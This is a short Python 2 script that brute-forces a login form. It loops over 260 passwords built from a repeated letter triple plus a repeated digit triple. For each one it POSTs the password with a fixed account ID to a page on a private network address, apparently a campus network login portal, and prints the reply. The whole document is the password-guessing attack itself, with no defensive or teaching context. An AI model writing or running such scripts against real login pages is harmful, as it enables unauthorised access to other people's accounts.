#!/usr/bin/env python    
# -*- coding: utf-8 -*- 
import time
import requests

url = 'http://192.168.252.8/0.htm'
user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
headers = { 'User-Agent' : user_agent }
p1 = ['aaa','bbb','ccc','ddd','eee','fff','ggg','hhh','iii','jjj','kkk','lll','mmm','nnn','ooo','ppp','qqq','rrr','sss','ttt','uuu','vvv','www','xxx','yyy','zzz']
p2 = ['111','222','333','444','555','666','777','888','999','000']

len1 = len(p1)
len2 = len(p2)
for i in range(0,len1):
    for j in range(0, len2):
        psw = p1[i]+p2[j]
        params = {'DDDDD':'20150046','upass':str(psw)}
        r = requests.post(url, data = params, headers = headers)
        print r.text
